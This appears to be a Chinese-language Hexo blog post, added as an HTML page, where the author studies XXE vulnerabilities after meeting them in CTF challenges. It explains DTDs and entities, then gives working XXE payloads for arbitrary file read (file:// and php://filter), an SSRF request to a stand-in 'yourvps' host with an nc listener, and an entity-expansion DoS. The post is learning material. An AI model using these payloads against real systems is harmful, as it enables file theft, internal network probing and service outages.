@@ -1,0 +1,797 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/favicon.png?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="XXE," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="关于XXE漏洞，到目前为止我遇见过两次，一次在SWPUCTF线上赛，另一次在Jarvis OJ上，看过一些大牛们写的分析，但是自己没认真地研究过这个漏洞，反正春节我也想躲个清静，那就研究一下这个漏洞吧！ XML基本用法文档类型定义：DTD基本格式：1&amp;lt;!DOCTYPE 根元素名 [ 元素描述 ]&amp;gt; DTD介绍文档类型定义（DTD）可定义合法的XML文档构建模块。它使用一系列合法的元素来">
+<meta name="keywords" content="XXE">
+<meta property="og:type" content="article">
+<meta property="og:title" content="XXE漏洞学习分析">
+<meta property="og:url" content="http://yoursite.com/2018/02/16/XXE漏洞学习分析/index.html">
+<meta property="og:site_name" content="Willard&#39;s Blog">
+<meta property="og:description" content="关于XXE漏洞，到目前为止我遇见过两次，一次在SWPUCTF线上赛，另一次在Jarvis OJ上，看过一些大牛们写的分析，但是自己没认真地研究过这个漏洞，反正春节我也想躲个清静，那就研究一下这个漏洞吧！ XML基本用法文档类型定义：DTD基本格式：1&amp;lt;!DOCTYPE 根元素名 [ 元素描述 ]&amp;gt; DTD介绍文档类型定义（DTD）可定义合法的XML文档构建模块。它使用一系列合法的元素来">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2018-02-16T15:14:38.205Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="XXE漏洞学习分析">
+<meta name="twitter:description" content="关于XXE漏洞，到目前为止我遇见过两次，一次在SWPUCTF线上赛，另一次在Jarvis OJ上，看过一些大牛们写的分析，但是自己没认真地研究过这个漏洞，反正春节我也想躲个清静，那就研究一下这个漏洞吧！ XML基本用法文档类型定义：DTD基本格式：1&amp;lt;!DOCTYPE 根元素名 [ 元素描述 ]&amp;gt; DTD介绍文档类型定义（DTD）可定义合法的XML文档构建模块。它使用一系列合法的元素来">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2018/02/16/XXE漏洞学习分析/"/>
+
+
+
+
+
+  <title>XXE漏洞学习分析 | Willard's Blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Willard's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">我永远喜欢德国队！</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/02/16/XXE漏洞学习分析/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Willard">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="https://i.loli.net/2018/02/19/5a8ad395132b9.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Willard's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">XXE漏洞学习分析</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-02-16T16:52:36+08:00">
+                2018-02-16
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/漏洞学习/" itemprop="url" rel="index">
+                    <span itemprop="name">漏洞学习</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>关于XXE漏洞，到目前为止我遇见过两次，一次在SWPUCTF线上赛，另一次在Jarvis OJ上，看过一些大牛们写的分析，但是自己没认真地研究过这个漏洞，反正春节我也想躲个清静，那就研究一下这个漏洞吧！</p>
+<h1 id="XML基本用法"><a href="#XML基本用法" class="headerlink" title="XML基本用法"></a>XML基本用法</h1><h2 id="文档类型定义：DTD"><a href="#文档类型定义：DTD" class="headerlink" title="文档类型定义：DTD"></a>文档类型定义：DTD</h2><p>基本格式：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE 根元素名 [ 元素描述 ]&gt;</span></span><br></pre></td></tr></table></figure></p>
+<h2 id="DTD介绍"><a href="#DTD介绍" class="headerlink" title="DTD介绍"></a>DTD介绍</h2><p>文档类型定义（DTD）可定义合法的XML文档构建模块。它使用一系列合法的元素来定义文档的结构。<br>DTD 可被成行地声明于 XML 文档中，也可作为一个外部引用。<br>带有 DTD 的 XML 文档实例<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE note [&lt;!--定义此文档是 note 类型的文档--&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT note (to,from,heading,body)&gt;&lt;!--定义note元素有四个元素--&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT to (#PCDATA)&gt;&lt;!--定义to元素为”#PCDATA”类型--&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT from (#PCDATA)&gt;&lt;!--定义from元素为”#PCDATA”类型--&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT head (#PCDATA)&gt;&lt;!--定义head元素为”#PCDATA”类型--&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT body (#PCDATA)&gt;&lt;!--定义body元素为”#PCDATA”类型--&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">to</span>&gt;</span>Dave<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">from</span>&gt;</span>Tom<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>You are a good man<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<h2 id="XML实体分为普通实体和参数实体两类："><a href="#XML实体分为普通实体和参数实体两类：" class="headerlink" title="XML实体分为普通实体和参数实体两类："></a>XML实体分为普通实体和参数实体两类：</h2><h3 id="普通实体"><a href="#普通实体" class="headerlink" title="普通实体"></a>普通实体</h3><p>内部：<br><figure class="highlight vhdl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!<span class="keyword">ENTITY</span> <span class="keyword">file</span> <span class="string">"file:///路径"</span>&gt;</span><br></pre></td></tr></table></figure></p>
+<p>外部：<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY file<span class="built_in"> SYSTEM </span><span class="string">"外部文件URL地址"</span>&gt;</span><br></pre></td></tr></table></figure></p>
+<p>引用:<br><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;<span class="built_in">file</span>;(根据实际情况，不一定是<span class="built_in">file</span></span><br></pre></td></tr></table></figure></p>
+<h3 id="参数实体"><a href="#参数实体" class="headerlink" title="参数实体"></a>参数实体</h3><p>内部：<br><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="title">!ENTITY</span> <span class="symbol">%file</span> <span class="string">"file:///路径"</span>&gt;</span><br></pre></td></tr></table></figure></p>
+<p>外部：<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY file<span class="built_in"> SYSTEM </span><span class="string">"外部文件URL地址"</span>&gt;</span><br></pre></td></tr></table></figure></p>
+<p>引用：<br><figure class="highlight haml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">%<span class="selector-tag">file</span></span>;(同上</span><br></pre></td></tr></table></figure></p>
+<p>##一个完整的简短XML示例<br>这是一个普通实体的内部访问实例。<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE root[</span></span><br><span class="line"><span class="meta">&lt;!ENTITY will "Hello World!"&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span>&amp;will;<span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<h1 id="XXE漏洞造成的危害"><a href="#XXE漏洞造成的危害" class="headerlink" title="XXE漏洞造成的危害"></a>XXE漏洞造成的危害</h1><h2 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h2><p>构造以下XML(这里是外部访问，所以要带上SYSTEM)，然后发送:<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE root[</span></span><br><span class="line"><span class="meta">&lt;!ENTITY file SYSTEM "file:///路径"&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span>&amp;file;<span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>JarvisOJ上的原题来源于这个漏洞，链接<a href="http://web.jarvisoj.com:9882/" target="_blank" rel="noopener">api调用</a> ，题目要求也就是获取目标机器/home/ctf/flag.txt中的flag值。<br>还有一个点需要注意，如果读取的是php文件，直接用file读取会导致解析错误，此时可以利用php://filter将内容转换为base64后再读取。<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE root [&lt;!ENTITY  file SYSTEM "php://filter/convert.base64-encode/resource=index.php"&gt;]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span>&amp;file;<span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<h2 id="URL请求-SSRF攻击"><a href="#URL请求-SSRF攻击" class="headerlink" title="URL请求 SSRF攻击"></a>URL请求 SSRF攻击</h2><p>设置监听端口，比如1231（环境为Ubuntu 14.04）<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nc -lvvp <span class="number">1231</span></span><br></pre></td></tr></table></figure></p>
+<p>然后构造<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE root [</span></span><br><span class="line"><span class="meta">&lt;!ENTITY file SYSTEM "http://yourvps"&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span>&amp;file;<span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>这时浏览器会一直处于加载状态，但是Ubuntu上能看到相关的访问信息。</p>
+<h2 id="Dos"><a href="#Dos" class="headerlink" title="Dos"></a>Dos</h2><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="params">&lt;!DOCTYPE data [</span></span><br><span class="line"><span class="params">&lt;!ELEMENT data (#ANY)&gt;</span></span><br><span class="line"><span class="params">&lt;!ENTITY a0 "dos" &gt;</span></span><br><span class="line"><span class="params">&lt;!ENTITY a1 "<span class="variable">&amp;a0</span>;<span class="variable">&amp;a0</span>;<span class="variable">&amp;a0</span>;<span class="variable">&amp;a0</span>;<span class="variable">&amp;a0</span>;"&gt;</span></span><br><span class="line"><span class="params">&lt;!ENTITY a2 "<span class="variable">&amp;a1</span>;<span class="variable">&amp;a1</span>;<span class="variable">&amp;a1</span>;<span class="variable">&amp;a1</span>;<span class="variable">&amp;a1</span>;"&gt;</span></span><br><span class="line">]&gt;</span><br><span class="line"><span class="params">&lt;data&gt;</span><span class="variable">&amp;a2</span>;<span class="params">&lt;/data&gt;</span></span><br></pre></td></tr></table></figure>
+<p>如果解析得很慢，说明测试成功。</p>
+<p>参考文章：<br><a href="https://www.anquanke.com/post/id/86075" target="_blank" rel="noopener">XXE注入攻击笔记</a><br><a href="https://chybeta.github.io/2017/07/04/%E5%B0%8F%E8%AF%95XML%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB/" target="_blank" rel="noopener">小试XML实体注入攻击</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/XXE/" rel="tag"># XXE</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/02/15/JarvisOJ/" rel="next" title="JarvisOJ Writeup">
+                <i class="fa fa-chevron-left"></i> JarvisOJ Writeup
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/02/17/sqlilab-wp/" rel="prev" title="sqlilabs Less-1~Less-4 writeup">
+                sqlilabs Less-1~Less-4 writeup <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="https://i.loli.net/2018/02/19/5a8ad395132b9.jpg"
+                alt="Willard" />
+            
+              <p class="site-author-name" itemprop="name">Willard</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives">
+              
+                  <span class="site-state-item-count">17</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">8</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">11</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://030.im/" title="Misaka030" target="_blank">Misaka030</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://guoxiaobo.com/" title="Guo Sir" target="_blank">Guo Sir</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://cicisite.me/" title="cici大佬" target="_blank">cici大佬</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#XML基本用法"><span class="nav-number">1.</span> <span class="nav-text">XML基本用法</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#文档类型定义：DTD"><span class="nav-number">1.1.</span> <span class="nav-text">文档类型定义：DTD</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#DTD介绍"><span class="nav-number">1.2.</span> <span class="nav-text">DTD介绍</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XML实体分为普通实体和参数实体两类："><span class="nav-number">1.3.</span> <span class="nav-text">XML实体分为普通实体和参数实体两类：</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#普通实体"><span class="nav-number">1.3.1.</span> <span class="nav-text">普通实体</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#参数实体"><span class="nav-number">1.3.2.</span> <span class="nav-text">参数实体</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#XXE漏洞造成的危害"><span class="nav-number">2.</span> <span class="nav-text">XXE漏洞造成的危害</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#任意文件读取"><span class="nav-number">2.1.</span> <span class="nav-text">任意文件读取</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#URL请求-SSRF攻击"><span class="nav-number">2.2.</span> <span class="nav-text">URL请求 SSRF攻击</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Dos"><span class="nav-number">2.3.</span> <span class="nav-text">Dos</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Willard</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+本站总访问量 <span id="busuanzi_value_site_pv"></span> &nbsp&nbsp&nbsp
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
